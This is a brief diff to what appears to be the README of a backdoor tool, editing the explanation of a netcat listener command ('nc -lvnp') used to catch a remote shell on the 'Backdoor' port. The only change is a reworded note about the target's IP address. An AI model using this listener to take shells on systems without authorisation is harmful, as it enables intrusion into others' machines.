@@ -18,7 +18,7 @@
 
 ## NetCat Command
     stty raw -echo; (stty size; cat) | nc -lvnp rport rhost
-* rhost = the target
+* rhost = IP adress from the target
 * rport = the port you want to use for the Backdoor (same as lport).
 
 ## Tested on
